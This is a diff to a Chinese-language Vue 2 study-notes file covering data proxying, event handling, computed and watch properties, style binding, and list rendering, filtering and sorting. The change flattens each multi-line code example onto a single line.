@@ -237,52 +237,19 @@ Object.defineProperty(dog,"num",{
 一个简单的数据代理，操作obj_2来代理obj_1
 
 ~~~html
-<script>
-        let obj_1 = {a:100}
-        let obj_2 = {b:200}
-
-        Object.defineProperty(obj_2,'a',{ 
-            get(){
-                return obj_1.a
-            },
-            set(value){
-                obj_1.a = value
-            }
-         })
-    </script>
+<script>        let obj_1 = {a:100}        let obj_2 = {b:200}        Object.defineProperty(obj_2,'a',{             get(){                return obj_1.a            },            set(value){                obj_1.a = value            }         })    </script>
 ~~~
 
 控制输入输出如下
 
 ~~~shell
-obj_2.a
-：100
-obj_2.a = 300
-：300
-obj_1
-：{a: 300}
+obj_2.a：100obj_2.a = 300：300obj_1：{a: 300}
 ~~~
 
 ### vue中的数据代理
 
 ~~~html
-<body>
-    <div id="app">
-        <h1>姓名： {{ name }}</h1>
-        <h1>地址： {{ address }}</h1>
-    </div>
-
-    <script src="../node_modules/vue/dist/vue.js"></script>
-    <script>
-        let vm = new Vue({
-           el: '#app',
-           data: {
-               name: 'shishi',
-               address: 'xxx 省 xxx 市'
-           }
-        })
-    </script>
-</body>
+<body>    <div id="app">        <h1>姓名： {{ name }}</h1>        <h1>地址： {{ address }}</h1>    </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script>        let vm = new Vue({           el: '#app',           data: {               name: 'shishi',               address: 'xxx 省 xxx 市'           }        })    </script></body>
 ~~~
 
 控制台输入vm打印可以看到很多属性，其中会出现 name 和 address属性，鼠标放在属性值的括号内容上，会出现 提示`Invoke property getter`的提示，就是读取该属性时候调用了getter（data中的对应的属性），同理setter（控制台修改vm的该属性，在vue调试工具里也可以看到data中的属性值也发生了改变，上面的代码也会让页面的数据也发生改变了，或者控制台输入vm.$data或者vm._data），也能看到变化，因为data是存、存储在vm实例中的）。
@@ -298,35 +265,13 @@ obj_1
 ### 1.简单使用：
 
 ~~~html
-<body>
-    <div id="app">
-        <button v-on:click = 'show'>{{ info }}</button>
-    </div>
-    <script src="../node_modules/vue/dist/vue.js"></script>
-    <script>
-        let vm = new Vue({
-           el: '#app',
-           data: {
-                info: '点击我'
-           },
-           methods: {
-               show(event){
-                   console.log(this);
-                   console.log(this === vm);
-                   console.log(event);
-               }
-           }
-        })
-    </script>
-</body>
+<body>    <div id="app">        <button v-on:click = 'show'>{{ info }}</button>    </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script>        let vm = new Vue({           el: '#app',           data: {                info: '点击我'           },           methods: {               show(event){                   console.log(this);                   console.log(this === vm);                   console.log(event);               }           }        })    </script></body>
 ~~~
 
 点击之后：控制台输出
 
 ~~~shell
-Vue {_uid: 0, _isVue: true, $options: {…}, _renderProxy: Proxy, _self: Vue, …}
-true
-MouseEvent {isTrusted: true, screenX: 46, screenY: 89, clientX: 46, clientY: 16, …}
+Vue {_uid: 0, _isVue: true, $options: {…}, _renderProxy: Proxy, _self: Vue, …}trueMouseEvent {isTrusted: true, screenX: 46, screenY: 89, clientX: 46, clientY: 16, …}
 ~~~
 
 * 如果方法使用了箭头函数的话，this将变为Window，建议不适用箭头函数
@@ -338,31 +283,7 @@ MouseEvent {isTrusted: true, screenX: 46, screenY: 89, clientX: 46, clientY: 16
 * 如果传参数
 
 ~~~html
-<body>
-    <div id="app">
-        <button v-on:click = 'show'>{{ info }}</button>
-        <button v-on:click = 'show2(info)'>{{ info }}</button>
-    </div>
-    <script src="../node_modules/vue/dist/vue.js"></script>
-    <script>
-        let vm = new Vue({
-           el: '#app',
-           data: {
-                info: '点击我'
-           },
-           methods: {
-               show(event){
-                   console.log(this);
-                   console.log(this === vm);
-                   console.log(event);
-               },
-               show2(msg){
-                   console.log(msg);
-               }
-           }
-        })
-    </script>
-</body>
+<body>    <div id="app">        <button v-on:click = 'show'>{{ info }}</button>        <button v-on:click = 'show2(info)'>{{ info }}</button>    </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script>        let vm = new Vue({           el: '#app',           data: {                info: '点击我'           },           methods: {               show(event){                   console.log(this);                   console.log(this === vm);                   console.log(event);               },               show2(msg){                   console.log(msg);               }           }        })    </script></body>
 ~~~
 
 点击输出 
@@ -376,21 +297,13 @@ MouseEvent {isTrusted: true, screenX: 46, screenY: 89, clientX: 46, clientY: 16
 1. 可以直接使用event，不用参数接受
 
 ~~~javascript
-show2(msg){
-       console.log(msg);
-       console.log(event);//同样也能获取到
-}
+show2(msg){       console.log(msg);       console.log(event);//同样也能获取到}
 ~~~
 
 2. 在实参里使用占位符，同样也能接受到
 
 ~~~html
-<button v-on:click = 'show2(info,$event)'>{{ info }}</button>
-
-show2(msg,event333){
-      console.log(msg);
-      console.log(event333);
-}
+<button v-on:click = 'show2(info,$event)'>{{ info }}</button>show2(msg,event333){      console.log(msg);      console.log(event333);}
 ~~~
 
 * 注意：这里的两个方法也将出现到vm实例上，但是没有做数据代理（因为没必要，它只是个方法，写啥样，就啥样）
@@ -398,22 +311,13 @@ show2(msg,event333){
 * 所以可以直接写到vm属性上，不用写到methods里
 
 ~~~javascript
-vm.show2 = function(msg,event333){
-                   console.log(msg);
-                   console.log(event333);
-               }
+vm.show2 = function(msg,event333){                   console.log(msg);                   console.log(event333);               }
 ~~~
 
 * 甚至可以写到data里, 但是这样会让vue给他做数据代理和数据劫持，非常不建议这样写
 
 ~~~javascript
-data: {
-      info: '点击我',
-      show2(msg,event333){
-      		console.log(msg);
-      		 console.log(event333);
-        }
-},
+data: {      info: '点击我',      show2(msg,event333){      		console.log(msg);      		 console.log(event333);        }},
 ~~~
 
 ### 2.事件修饰符
@@ -421,28 +325,7 @@ data: {
 例子：取消a标签的默认跳转行为
 
 ~~~html
-<body>
-    <div id="app">
-        <h1>hello {{ name }}</h1>
-        <a href="http://www.baidu.com" @click = "show">百度一下</a>
-    </div>
-    <script src="../node_modules/vue/dist/vue.js"></script>
-    <script>
-
-        new Vue({
-           el: '#app',
-           data: {
-               name: 'shishi'
-           },
-           methods: {
-               show(event){
-                   alert("hello !!!")
-                   event.preventDefault()
-               }
-           }
-        })
-    </script>
-</body>
+<body>    <div id="app">        <h1>hello {{ name }}</h1>        <a href="http://www.baidu.com" @click = "show">百度一下</a>    </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script>        new Vue({           el: '#app',           data: {               name: 'shishi'           },           methods: {               show(event){                   alert("hello !!!")                   event.preventDefault()               }           }        })    </script></body>
 ~~~
 
 * 这里使用的是event的preventDefault方法来取消事件默认行为
@@ -467,26 +350,7 @@ vue一共给我们提供了六个事件修饰符
 * 使用.enter来表示回车按键
 
 ~~~html
-<body>
-    <div id="app">
-        <input type="text" v-model = msg @keyup.enter="show">
-    </div>
-    <script src="../node_modules/vue/dist/vue.js"></script>
-    <script>
-
-        new Vue({
-           el: '#app',
-           data: {
-               msg: 'hh'
-           },
-           methods: {
-               show(){
-                   console.log(event.target.value);
-               }
-           }
-        })
-    </script>
-</body>
+<body>    <div id="app">        <input type="text" v-model = msg @keyup.enter="show">    </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script>        new Vue({           el: '#app',           data: {               msg: 'hh'           },           methods: {               show(){                   console.log(event.target.value);               }           }        })    </script></body>
 ~~~
 
 * 一共有九个常用的别名
@@ -587,10 +451,7 @@ vue一共给我们提供了六个事件修饰符
 * 而且计算属性有缓存，如果这样写，get只被调用了一次
 
 ~~~html
-全名：<span>{{ name }}</span>
-全名：<span>{{ name }}</span>
-全名：<span>{{ name }}</span>
-全名：<span>{{ name }}</span>
+全名：<span>{{ name }}</span>全名：<span>{{ name }}</span>全名：<span>{{ name }}</span>全名：<span>{{ name }}</span>
 ~~~
 
 * get什么时候被调用？
@@ -601,34 +462,7 @@ vue一共给我们提供了六个事件修饰符
 * 当确定该属性只读不改时，可以使用简写
 
 ~~~html
-<body>
-    <div id="app">
-        姓：
-        <input type="text" v-model = 'firstName'>
-        <br>
-        名：
-        <input type="text" v-model = 'lastName'>
-        <br>
-        全名：<span>{{ name }}</span>
-    </div>
-    <script src="../node_modules/vue/dist/vue.js"></script>
-    <script>
-       let vm = new Vue({
-          el: '#app',
-          data () {
-             return {
-                 firstName : 'd',
-                 lastName: 'g'
-             }
-          },
-          computed: {
-              name () { 
-                  return this.firstName+this.lastName
-               }
-          }
-       })
-    </script>
-</body>
+<body>    <div id="app">        姓：        <input type="text" v-model = 'firstName'>        <br>        名：        <input type="text" v-model = 'lastName'>        <br>        全名：<span>{{ name }}</span>    </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script>       let vm = new Vue({          el: '#app',          data () {             return {                 firstName : 'd',                 lastName: 'g'             }          },          computed: {              name () {                   return this.firstName+this.lastName               }          }       })    </script></body>
 ~~~
 
 * 注意{{}}里不要加（），它是计算属性，虽然写成了函数，他只是get函数，返回的值以name作为名字属性保存到vm上
@@ -636,44 +470,7 @@ vue一共给我们提供了六个事件修饰符
 ## 九监视属性
 
 ~~~html
-<body>
-    <div id="app">
-        <h1>今天的温度：{{value}}°</h1>
-        <h2>今天的天气： {{info}}</h2>
-        <button @click='upT'>更新温度</button>
-    </div>
-    <script src="../node_modules/vue/dist/vue.js"></script>
-    <script>
-        new Vue({
-           el: '#app',
-           data () {
-              return {
-                  value: 29
-              }
-           },
-           computed: {
-               info(){
-                   return (this.value > 23) ?  "炎热":  '寒冷'
-               }
-           },
-           methods: {
-               upT(){
-                   this.value = parseInt(Math.random()*35)
-               }
-           },
-           watch: {
-               value:{
-                   //当value发生改变时候，handler会被调用
-                   handler(newValue, oldValue){
-                        console.log('value 被修改了');
-                        console.log("原来的值：",oldValue);
-                        console.log("新的值：  ",newValue);
-                   }
-               }
-           }
-        })
-    </script>
-</body>
+<body>    <div id="app">        <h1>今天的温度：{{value}}°</h1>        <h2>今天的天气： {{info}}</h2>        <button @click='upT'>更新温度</button>    </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script>        new Vue({           el: '#app',           data () {              return {                  value: 29              }           },           computed: {               info(){                   return (this.value > 23) ?  "炎热":  '寒冷'               }           },           methods: {               upT(){                   this.value = parseInt(Math.random()*35)               }           },           watch: {               value:{                   //当value发生改变时候，handler会被调用                   handler(newValue, oldValue){                        console.log('value 被修改了');                        console.log("原来的值：",oldValue);                        console.log("新的值：  ",newValue);                   }               }           }        })    </script></body>
 ~~~
 
 * watch监视属性
@@ -685,31 +482,13 @@ vue一共给我们提供了六个事件修饰符
   * 还有一些其他的配置，例如immediate
 
   * ~~~javascript
-    watch: {
-                   value:{
-                       immediate: true,//初始化时候让handler被调用一次
-                       //当value发生改变时候，handler会被调用
-                       handler(newValue, oldValue){
-                            console.log('value 被修改了');
-                            console.log("原来的值：",oldValue);
-                            console.log("新的值：  ",newValue);
-                       }
-                   }
-               }
+    watch: {               value:{                   immediate: true,//初始化时候让handler被调用一次                   //当value发生改变时候，handler会被调用                   handler(newValue, oldValue){                        console.log('value 被修改了');                        console.log("原来的值：",oldValue);                        console.log("新的值：  ",newValue);                   }               }           }
     ~~~
 
 * 或者在vm实例上加监视（写在外面）
 
 ~~~javascript
-vm.$watch('value',{ 
-            immediate: true,
-            //当value发生改变时候，handler会被调用
-            handler(newValue, oldValue){
-                 console.log('value 被修改了');
-                 console.log("原来的值：",oldValue);
-                 console.log("新的值：  ",newValue);
-            }
-         })
+vm.$watch('value',{             immediate: true,            //当value发生改变时候，handler会被调用            handler(newValue, oldValue){                 console.log('value 被修改了');                 console.log("原来的值：",oldValue);                 console.log("新的值：  ",newValue);            }         })
 ~~~
 
 ### 深度监视
@@ -717,33 +496,7 @@ vm.$watch('value',{
 ### 监视多层次的属性
 
 ~~~html
-<body>
-    <div id="app">
-        <h1>a : {{numbers.a}}</h1>
-        <button @click='numbers.a++'>a++</button>
-    </div>
-    <script src="../node_modules/vue/dist/vue.js"></script>
-    <script>
-        let vm = new Vue({
-           el: '#app',
-           data () {
-              return {
-                  numbers: {
-                      a: 1,
-                      b: 2
-                  }
-              }
-           },
-           watch: {
-             'numbers.a' : {
-                  handler(){
-                    console.log('a 变了');
-                  }
-              }
-           }
-        })
-    </script>
-</body>
+<body>    <div id="app">        <h1>a : {{numbers.a}}</h1>        <button @click='numbers.a++'>a++</button>    </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script>        let vm = new Vue({           el: '#app',           data () {              return {                  numbers: {                      a: 1,                      b: 2                  }              }           },           watch: {             'numbers.a' : {                  handler(){                    console.log('a 变了');                  }              }           }        })    </script></body>
 ~~~
 
 * 注意number.a写成字符串，加上引号，表示一个属性名（即要监视的属性）
@@ -751,35 +504,7 @@ vm.$watch('value',{
 * 深度监视：numbers中有变化的监视
 
 ~~~html
-<body>
-    <div id="app">
-        <h1>a : {{numbers.a}}</h1>
-        <button @click='numbers.a++'>a++</button>
-        <h1>b: {{numbers.b}}</h1>
-        <button @click='numbers.b++'>b++</button>
-    </div>
-    <script src="../node_modules/vue/dist/vue.js"></script>
-    <script>
-        let vm = new Vue({
-           el: '#app',
-           data () {
-              return {
-                  numbers: {
-                      a: 1,
-                      b: 2
-                  }
-              }
-           },
-           watch: {
-             numbers: {
-                 handler(){
-                    console.log('numbers 变了');
-                 }
-             }
-           }
-        })
-    </script>
-</body>
+<body>    <div id="app">        <h1>a : {{numbers.a}}</h1>        <button @click='numbers.a++'>a++</button>        <h1>b: {{numbers.b}}</h1>        <button @click='numbers.b++'>b++</button>    </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script>        let vm = new Vue({           el: '#app',           data () {              return {                  numbers: {                      a: 1,                      b: 2                  }              }           },           watch: {             numbers: {                 handler(){                    console.log('numbers 变了');                 }             }           }        })    </script></body>
 ~~~
 
 * 这样写是错误的，因为numbers是复杂数据类型，指针地址是没改变的，a,b变了它的地址是不会变的
@@ -787,14 +512,7 @@ vm.$watch('value',{
 * 所以要加深度监视配置deep: true,
 
 ~~~javascript
-watch: {
-     numbers: {
-         deep: true,
-         handler(){
-              console.log('numbers 变了');
-         }
-     }
-}
+watch: {     numbers: {         deep: true,         handler(){              console.log('numbers 变了');         }     }}
 ~~~
 
 ### 监视的简写形式
@@ -802,23 +520,13 @@ watch: {
 * 如果不需要配置项，只有handler的时候就可以使用简写
 
 ~~~javascript
-watch: {
-     value(newValue,oldValue){
-          console.log('value 发生了改变');
-          console.log("原来的值：",oldValue);
-          console.log("新的值：  ",newValue);
-     }
-}
+watch: {     value(newValue,oldValue){          console.log('value 发生了改变');          console.log("原来的值：",oldValue);          console.log("新的值：  ",newValue);     }}
 ~~~
 
 或者(vue管理的函数千万不要用箭头函数)
 
 ~~~javascript
- vm.$watch("value", function(newValue,oldValue){
-            console.log('value 被修改了');
-            console.log("原来的值：",oldValue);
-            console.log("新的值：  ",newValue);
-        })
+ vm.$watch("value", function(newValue,oldValue){            console.log('value 被修改了');            console.log("原来的值：",oldValue);            console.log("新的值：  ",newValue);        })
 ~~~
 
 ## 十 绑定样式
@@ -828,64 +536,7 @@ watch: {
 * 适用于样式的类名不确定，需要动态绑定
 
 ~~~html
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
-    <style>
-        .w1{
-            width: 100px;
-            height: 100px;
-        }
-        .w2{
-            width: 200px;
-            height: 200px;
-        }
-        .w3{
-            width: 300px;
-            height: 300px;
-        }
-        .s1{
-            
-            background: red;
-        }
-        .s2{
-            background: green;
-        }
-        .s3{
-            background: bisque;
-        }
-    </style>
-</head>
-<body>
-    <div id="app">
-        <div @click='change' :class='color +" "+size'>
-            这里
-        </div>
-    </div>
-    <script src="../node_modules/vue/dist/vue.js"></script>
-    <script>
-        new Vue({
-           el: '#app',
-           data () {
-               return {
-                  size: 'w2',
-                  color: 's2'
-               }
-           },
-           methods: {
-               change(){
-                  this.color = 's3'
-                  this.size = 'w3'
-               }
-           }
-        })
-    </script>
-</body>
-</html>
+<!DOCTYPE html><html lang="en"><head>    <meta charset="UTF-8">    <meta http-equiv="X-UA-Compatible" content="IE=edge">    <meta name="viewport" content="width=device-width, initial-scale=1.0">    <title>Document</title>    <style>        .w1{            width: 100px;            height: 100px;        }        .w2{            width: 200px;            height: 200px;        }        .w3{            width: 300px;            height: 300px;        }        .s1{                        background: red;        }        .s2{            background: green;        }        .s3{            background: bisque;        }    </style></head><body>    <div id="app">        <div @click='change' :class='color +" "+size'>            这里        </div>    </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script>        new Vue({           el: '#app',           data () {               return {                  size: 'w2',                  color: 's2'               }           },           methods: {               change(){                  this.color = 's3'                  this.size = 'w3'               }           }        })    </script></body></html>
 ~~~
 
 ### 数组类形式
@@ -897,64 +548,7 @@ watch: {
 * 适用于样式个数确定，名字也确定，但是需要动态决定是否启用样式
 
 ~~~html
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
-    <style>
-        .w1{
-            width: 100px;
-            height: 100px;
-        }
-        .w2{
-            width: 200px;
-            height: 200px;
-        }
-        .w3{
-            width: 300px;
-            height: 300px;
-        }
-        .s1{
-            
-            background: red;
-        }
-        .s2{
-            background: green;
-        }
-        .s3{
-            background: bisque;
-        }
-    </style>
-</head>
-<body>
-    <div id="app">
-        <div @click='change' :class='style'>
-            这里
-        </div>
-    </div>
-    <script src="../node_modules/vue/dist/vue.js"></script>
-    <script>
-        new Vue({
-           el: '#app',
-           data () {
-               return {
-                  style:{
-                      s1: false,
-                      s2: false,
-                      s3: true,
-                      w1: false,
-                      w2: false,
-                      w3: true
-                  }
-               }
-           },
-        })
-    </script>
-</body>
-</html>
+<!DOCTYPE html><html lang="en"><head>    <meta charset="UTF-8">    <meta http-equiv="X-UA-Compatible" content="IE=edge">    <meta name="viewport" content="width=device-width, initial-scale=1.0">    <title>Document</title>    <style>        .w1{            width: 100px;            height: 100px;        }        .w2{            width: 200px;            height: 200px;        }        .w3{            width: 300px;            height: 300px;        }        .s1{                        background: red;        }        .s2{            background: green;        }        .s3{            background: bisque;        }    </style></head><body>    <div id="app">        <div @click='change' :class='style'>            这里        </div>    </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script>        new Vue({           el: '#app',           data () {               return {                  style:{                      s1: false,                      s2: false,                      s3: true,                      w1: false,                      w2: false,                      w3: true                  }               }           },        })    </script></body></html>
 ~~~
 
 * 为了灵活应用，一般都会将true和false提出变量动态使用
@@ -1074,26 +668,7 @@ watch: {
 * v-else-if： 由名可知用法，与if，else if，else 的用法是一样的
 
 ~~~html
-<body>
-    <div id="app">
-        <h1 v-if=isShow>我的名字是：{{ name }}</h1>
-        <h1 v-else>hhhhhhh</h1>
-        <button @click='isShow = !isShow'>点我 ！！！</button>
-    </div>
-    <script src="../node_modules/vue/dist/vue.js"></script>
-    <script>
-        new Vue({
-           el: '#app',
-           data () {
-              return {
-                  name: 'shishi',
-                  isShow: true
-              }
-           }
-        })
-    </script>
-
-</body>
+<body>    <div id="app">        <h1 v-if=isShow>我的名字是：{{ name }}</h1>        <h1 v-else>hhhhhhh</h1>        <button @click='isShow = !isShow'>点我 ！！！</button>    </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script>        new Vue({           el: '#app',           data () {              return {                  name: 'shishi',                  isShow: true              }           }        })    </script></body>
 ~~~
 
 注意多行显示隐藏的用法
@@ -1101,76 +676,33 @@ watch: {
 * 如果是这样的，这样显得愚蠢
 
 ~~~html
-<h1 v-if=isShow>我的名字是：{{ name }}</h1>
-<h1 v-if=isShow>我的名字是：{{ name }}</h1>
-<h1 v-if=isShow>我的名字是：{{ name }}</h1>
+<h1 v-if=isShow>我的名字是：{{ name }}</h1><h1 v-if=isShow>我的名字是：{{ name }}</h1><h1 v-if=isShow>我的名字是：{{ name }}</h1>
 ~~~
 
 * 优化一下，但是这样会影响页面结构
 
 ~~~html
-<div v-if=isShow>
-            <h1>我的名字是：{{ name }}</h1>
-            <h1>我的名字是：{{ name }}</h1>
-            <h1>我的名字是：{{ name }}</h1>
-</div>
+<div v-if=isShow>            <h1>我的名字是：{{ name }}</h1>            <h1>我的名字是：{{ name }}</h1>            <h1>我的名字是：{{ name }}</h1></div>
 ~~~
 
 * 使用模板template，页面渲染时候会将template脱去，但是只能和v-if配合使用，v-show没用
 
 ~~~html
-<template v-if=isShow>
-            <h1>我的名字是：{{ name }}</h1>
-            <h1>我的名字是：{{ name }}</h1>
-            <h1>我的名字是：{{ name }}</h1>
-</template>
+<template v-if=isShow>            <h1>我的名字是：{{ name }}</h1>            <h1>我的名字是：{{ name }}</h1>            <h1>我的名字是：{{ name }}</h1></template>
 ~~~
 
 ## 十二 列表渲染
 
 * v-for遍历， :key 是必要的，表示每一个遍历的元素的唯一标识
 * ul li 这里只是为了让结构清晰，谁加了v-for，就让谁遍历生成
-*  v-for="(p,index) in persons" 表示每一个遍历可以接受到两个参数：
+* v-for="(p,index) in persons" 表示每一个遍历可以接受到两个参数：
   * 每一个遍历的数据
   * 对应的index
   * 如果不需要index，也可以写成 p in persons
   * in 和 of 两个都行：  p of persons
 
 ~~~html
-<body>
-    <div id="app">
-        <ul>
-            <li v-for="(p,index) in persons" :key="index"> 序号：{{ index }} id：{{ p.id }} 名字：{{ p.name }} 年龄： {{ p.age }}</li>
-        </ul>
-    </div>
-    <script src="../node_modules/vue/dist/vue.js"></script>
-    <script>
-        new Vue({
-           el: '#app',
-           data () {
-              return {
-                  persons:[
-                      {
-                          id: 01,
-                          name: 'shishi',
-                          age: '12'
-                      },
-                      {
-                          id: 02,
-                          name: 'zhan',
-                          age: '16'
-                      },
-                      {
-                          id: 03,
-                          name: 'geigei',
-                          age: '16'
-                      }
-                  ]
-              }
-           }
-        })
-    </script>
-</body>
+<body>    <div id="app">        <ul>            <li v-for="(p,index) in persons" :key="index"> 序号：{{ index }} id：{{ p.id }} 名字：{{ p.name }} 年龄： {{ p.age }}</li>        </ul>    </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script>        new Vue({           el: '#app',           data () {              return {                  persons:[                      {                          id: 01,                          name: 'shishi',                          age: '12'                      },                      {                          id: 02,                          name: 'zhan',                          age: '16'                      },                      {                          id: 03,                          name: 'geigei',                          age: '16'                      }                  ]              }           }        })    </script></body>
 ~~~
 
 * 可以遍历数组，也可以遍历对象，注意接受的参数就行了（value， key）键值对
@@ -1184,48 +716,7 @@ watch: {
 ### key的作用和原理
 
 ~~~html
-<body>
-    <div id="app">
-        <ul>
-           <li v-for="(p,index) in persons" :key="index">
-                 {{ index }} ------{{ p.name }} ------{{ p.id }}
-                 <input type="text">
-            </li>
-        </ul>
-        <button @click='add'>添加一条数据</button>
-    </div>
-    <script src="../node_modules/vue/dist/vue.js"></script>
-    <script>
-        new Vue({
-           el: '#app',
-           data () {
-              return {
-                  persons:[
-                      {
-                          id: 01,
-                          name: 'shishi',
-                      },
-                      {
-                          id: 02,
-                          name: 'zhan',
-                      },
-                      {
-                          id: 03,
-                          name: 'geigei',
-                      }
-                  ]
-              }
-           },
-           methods: {
-               add(){
-                    let p = {id: 04,name: 'meimei'}
-                    console.log(p);
-                    this.persons.unshift(p)
-               }
-           }
-        })
-    </script>
-</body>
+<body>    <div id="app">        <ul>           <li v-for="(p,index) in persons" :key="index">                 {{ index }} ------{{ p.name }} ------{{ p.id }}                 <input type="text">            </li>        </ul>        <button @click='add'>添加一条数据</button>    </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script>        new Vue({           el: '#app',           data () {              return {                  persons:[                      {                          id: 01,                          name: 'shishi',                      },                      {                          id: 02,                          name: 'zhan',                      },                      {                          id: 03,                          name: 'geigei',                      }                  ]              }           },           methods: {               add(){                    let p = {id: 04,name: 'meimei'}                    console.log(p);                    this.persons.unshift(p)               }           }        })    </script></body>
 ~~~
 
 * 使用index作为 key值
@@ -1241,44 +732,7 @@ watch: {
 #### 使用监视属性实现
 
 ~~~html
-<body>
-    <div id="app">
-        <input type="text" placeholder="输入名字进行搜索" v-model='keyWords'>
-        <ul>
-            <li v-for="(p,index) in filPersons" :key="p.id"> 
-                id：{{ p.id }} 名字：{{ p.name }} 薪水 {{ p.salary }}
-            </li>
-        </ul>
-    </div>
-    <script src="../node_modules/vue/dist/vue.js"></script>
-    <script>
-        new Vue({
-           el: '#app',
-           data () {
-              return {
-                keyWords: '',
-                persons:[
-                      {id: 01,name: 'shishi',salary: 1000},
-                      {id: 02,name: 'zhan',salary: 3000},
-                      {id: 03,name: 'geigei',salary: 5000},
-                      {id: 04,name: 'shitt',salary: 9000},
-                  ],
-                  filPersons: []
-              }
-           },
-           watch: {
-               keyWords:{
-                   immediate: true,
-                   handler(value){
-                        this.filPersons = this.persons.filter((p)=>{
-                             return p.name.indexOf(value) !== -1
-                        })
-                   }
-               }
-           }
-        })
-    </script>
-</body>
+<body>    <div id="app">        <input type="text" placeholder="输入名字进行搜索" v-model='keyWords'>        <ul>            <li v-for="(p,index) in filPersons" :key="p.id">                 id：{{ p.id }} 名字：{{ p.name }} 薪水 {{ p.salary }}            </li>        </ul>    </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script>        new Vue({           el: '#app',           data () {              return {                keyWords: '',                persons:[                      {id: 01,name: 'shishi',salary: 1000},                      {id: 02,name: 'zhan',salary: 3000},                      {id: 03,name: 'geigei',salary: 5000},                      {id: 04,name: 'shitt',salary: 9000},                  ],                  filPersons: []              }           },           watch: {               keyWords:{                   immediate: true,                   handler(value){                        this.filPersons = this.persons.filter((p)=>{                             return p.name.indexOf(value) !== -1                        })                   }               }           }        })    </script></body>
 ~~~
 
 * 一定要加immediate配置，保证页面刚出来的时候有数据
@@ -1286,40 +740,7 @@ watch: {
 #### 使用计算属性实现
 
 ~~~html
-<body>
-    <div id="app">
-        <input type="text" placeholder="输入名字进行搜索" v-model='keyWords'>
-        <ul>
-            <li v-for="(p,index) in filPersons" :key="p.id"> 
-                id：{{ p.id }} 名字：{{ p.name }} 薪水 {{ p.salary }}
-            </li>
-        </ul>
-    </div>
-    <script src="../node_modules/vue/dist/vue.js"></script>
-    <script>
-        new Vue({
-           el: '#app',
-           data () {
-              return {
-                keyWords: '',
-                persons:[
-                      {id: 01,name: 'shishi',salary: 1000},
-                      {id: 02,name: 'zhan',salary: 3000},
-                      {id: 03,name: 'geigei',salary: 5000},
-                      {id: 04,name: 'shitt',salary: 9000},
-                  ],
-              }
-           },
-           computed: {
-               filPersons(){
-                   return this.persons.filter((p)=>{
-                       return p.name.indexOf(this.keyWords) !== -1
-                   })
-               }
-           }
-        })
-    </script>
-</body>
+<body>    <div id="app">        <input type="text" placeholder="输入名字进行搜索" v-model='keyWords'>        <ul>            <li v-for="(p,index) in filPersons" :key="p.id">                 id：{{ p.id }} 名字：{{ p.name }} 薪水 {{ p.salary }}            </li>        </ul>    </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script>        new Vue({           el: '#app',           data () {              return {                keyWords: '',                persons:[                      {id: 01,name: 'shishi',salary: 1000},                      {id: 02,name: 'zhan',salary: 3000},                      {id: 03,name: 'geigei',salary: 5000},                      {id: 04,name: 'shitt',salary: 9000},                  ],              }           },           computed: {               filPersons(){                   return this.persons.filter((p)=>{                       return p.name.indexOf(this.keyWords) !== -1                   })               }           }        })    </script></body>
 ~~~
 
 * 明显对比使用计算属性比较简单方便
@@ -1327,50 +748,7 @@ watch: {
 ### 列表排序
 
 ~~~html
-<body>
-    <div id="app">
-        <input type="text" placeholder="输入名字进行搜索" v-model='keyWords'>
-        <button @click='sortType=2'>薪水降序</button>
-        <button @click='sortType=1'>薪水升序</button>
-        <button @click='sortType=0'>原顺序</button>
-        <ul>
-            <li v-for="(p,index) in filPersons" :key="p.id"> 
-                id：{{ p.id }} 名字：{{ p.name }} 薪水 {{ p.salary }}
-            </li>
-        </ul>
-    </div>
-    <script src="../node_modules/vue/dist/vue.js"></script>
-    <script>
-        new Vue({
-           el: '#app',
-           data () {
-              return {
-                keyWords: '',
-                sortType: 0,//0 原顺序，1 升序，2 降序
-                persons:[
-                      {id: 01,name: 'shishi',salary: 1000},
-                      {id: 02,name: 'zhan',salary: 3000},
-                      {id: 03,name: 'geigei',salary: 5000},
-                      {id: 04,name: 'shitt',salary: 9000},
-                  ],
-              }
-           },
-           computed: {
-               filPersons(){
-                   let arr = this.persons.filter((p)=>{
-                       return p.name.indexOf(this.keyWords) !== -1
-                   })
-                   if(this.sortType){
-                        arr.sort((a,b)=>{
-                            return this.sortType===1 ? a.salary-b.salary : b.salary-a.salary
-                        })
-                   }
-                   return arr
-               }
-           }
-        })
-    </script>
-</body>
+<body>    <div id="app">        <input type="text" placeholder="输入名字进行搜索" v-model='keyWords'>        <button @click='sortType=2'>薪水降序</button>        <button @click='sortType=1'>薪水升序</button>        <button @click='sortType=0'>原顺序</button>        <ul>            <li v-for="(p,index) in filPersons" :key="p.id">                 id：{{ p.id }} 名字：{{ p.name }} 薪水 {{ p.salary }}            </li>        </ul>    </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script>        new Vue({           el: '#app',           data () {              return {                keyWords: '',                sortType: 0,//0 原顺序，1 升序，2 降序                persons:[                      {id: 01,name: 'shishi',salary: 1000},                      {id: 02,name: 'zhan',salary: 3000},                      {id: 03,name: 'geigei',salary: 5000},                      {id: 04,name: 'shitt',salary: 9000},                  ],              }           },           computed: {               filPersons(){                   let arr = this.persons.filter((p)=>{                       return p.name.indexOf(this.keyWords) !== -1                   })                   if(this.sortType){                        arr.sort((a,b)=>{                            return this.sortType===1 ? a.salary-b.salary : b.salary-a.salary                        })                   }                   return arr               }           }        })    </script></body>
 ~~~
 
